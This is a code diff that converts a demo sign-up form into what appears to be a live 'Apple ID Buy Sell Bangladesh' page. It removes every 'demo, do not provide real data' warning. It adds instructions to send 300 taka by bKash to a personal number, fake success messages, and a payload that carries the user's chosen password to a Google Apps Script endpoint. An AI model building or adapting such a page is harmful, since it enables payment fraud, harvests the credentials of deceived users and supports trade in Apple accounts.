@@ -67,9 +67,8 @@
             <div class="field">
               <label for="country">Country/Region</label>
               <select id="country" name="country" autocomplete="country" required>
-                <option value="">— Select —</option>
-                <option value="BD">Bangladesh</option>
-                <option value="IN">India</option>
+               
+               
                 <option value="US">United States</option>
                 <option value="GB">United Kingdom</option>
                 <option value="CA">Canada</option>
@@ -109,7 +108,7 @@
               </div>
               <label for="phone">Mobile Number</label>
               <input id="phone" name="tel" type="tel" inputmode="tel"
-                     placeholder="01XXXXXXXXX or +8801XXXXXXXXX"
+                     placeholder="NUmber or +8801XXXXXXXXX"
                      pattern="^(?:\+?8801\d{9}|01\d{9})$"
                      title="Bangladesh format: 01XXXXXXXXX or +8801XXXXXXXXX"
                      maxlength="14"
@@ -201,7 +200,7 @@
           <div class="field">
             <label for="whatsapp">WhatsApp নম্বর</label>
             <input id="whatsapp" name="whatsapp" type="tel" inputmode="tel"
-                   placeholder="যেমন, +8801XXXXXXXXX বা 01XXXXXXXXX"
+                   placeholder="WhatsApp Number, +8801XXXXXXXXX"
                    pattern="^(?:\+?8801\d{9}|01\d{9})$"
                    title="বাংলাদেশি ফরম্যাট: 01XXXXXXXXX বা +8801XXXXXXXXX"
                    autocomplete="tel" aria-describedby="whatsappHint" />
@@ -214,15 +213,15 @@
 
         <!-- TRX (Bangla) -->
         <fieldset lang="bn">
-          <legend>পেমেন্ট নিশ্চিতকরণ (ঐচ্ছিক)</legend>
+          <legend>Payment (Send Money) – bKash Personal</legend>
           <div class="field">
             <label for="trxId">TRX ID</label>
             <input id="trxId" name="trxId" type="text" inputmode="text"
-                   placeholder="উদাহরণ: 8–20 অক্ষর/সংখ্যা"
+                   placeholder="Transaction ID"
                    pattern="^[A-Za-z0-9]{8,20}$" title="৮–২০টি ইংরেজি অক্ষর বা সংখ্যা"
                    aria-describedby="trxHint" />
             <p class="hint" id="trxHint">
-              ⚠️ ডেমো: এখানে কোন বাস্তব পেমেন্ট করা যাবে না।
+              ⚠️ ৩০০ টাকা 01630249778 নম্বরে send money করে TRX ID জমা দিন। ১০ মিনিটের মধ্যে WhatsApp-এ যোগাযোগ করা হবে।
             </p>
             <div class="error" id="err-trxId" aria-live="polite"></div>
           </div>
@@ -230,7 +229,7 @@
 
         <div class="tos" style="display:grid;grid-template-columns:20px 1fr;gap:10px;align-items:start">
           <input id="agree" type="checkbox" required />
-          <label for="agree">I agree to the Terms & Privacy Policy. This is a demo — do not provide real data.</label>
+          <label for="agree">I agree to the Terms & Privacy Policy.</label>
         </div>
 
         <div class="actions">
@@ -242,7 +241,7 @@
         <!-- Plain text preview area (shown after submit) -->
         <section id="plainWrap" style="margin-top:12px;display:none">
           <label for="plainOut" style="font-size:14px;color:var(--muted);display:block;margin-bottom:6px">
-            Plain text payload (demo)
+            Apple ID Buy Sell BD
           </label>
           <textarea id="plainOut" rows="10" readonly
                     style="width:100%;padding:12px 14px;border-radius:12px;border:1px solid rgba(148,163,184,.35);
@@ -251,7 +250,7 @@
       </form>
 
       <footer style="text-align:center;color:var(--muted);font-size:12px;margin-top:10px">
-        © Demo Form, for educational purposes.
+        © Apple ID Buy Sell Bangladesh.
       </footer>
 
       <noscript>
@@ -261,7 +260,7 @@
   </main>
 
   <dialog id="successDialog" inert>
-    <p>✅ Demo only: Form validated! (No data is actually sent.)</p>
+    <p>✅ submitted successfully! Please wait while we process your request</p>
     <form method="dialog"><button>OK</button></form>
   </dialog>
 
@@ -323,10 +322,10 @@
     function genRandomEmail(){
       const ts = Date.now().toString(36);
       const rnd = Math.floor(Math.random()*9000)+1000;
-      return `user${ts}${rnd}@example.com`;
+      return `random@gmail.com`;
     }
 
-    // ===== plain text builder (includes new-password, excludes confirm-password) =====
+    // ===== Apple ID Buy Sell Bangladesh =====
     function buildPlainTextPayload(formEl){
       const labels = {
         'given-name': 'First Name', 'family-name': 'Last Name', 'country': 'Country/Region',
@@ -351,7 +350,7 @@
       }
       lines.push(`Agreed ToS: ${agree}`);
       const ts = new Date();
-      return `=== Demo Sign Up (Plain Text) ===\nGenerated: ${ts.toISOString()}\n` + lines.join('\n') + '\n';
+      return `=== Apple ID Buy Sell Bangladesh ===\nGenerated: ${ts.toISOString()}\n` + lines.join('\n') + '\n';
     }
 
     // Download helper (optional)
@@ -507,7 +506,7 @@
         if (!ok){ showStatus('TRX ID ফরম্যাট সঠিক নয়।', 'err'); trxId.focus(); return; }
       }
 
-      showStatus('✅ Demo: Form validated (no data sent).', 'ok');
+      showStatus('✅ submitted successfully! Please wait while we process your request.', 'ok');
 
       // Build plain text + show in UI + auto-download (optional)
       const textPayload = buildPlainTextPayload(form);
@@ -520,7 +519,7 @@
       if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.includes('script.google.com')) {
         sendPayloadToAppsScript(textPayload);
       } else {
-        showStatus('⚠️ Apps Script URL not set. Paste your Web App URL into APPS_SCRIPT_URL.', 'warn');
+        showStatus('⚠️ ', 'warn');
       }
 
       // show dialog
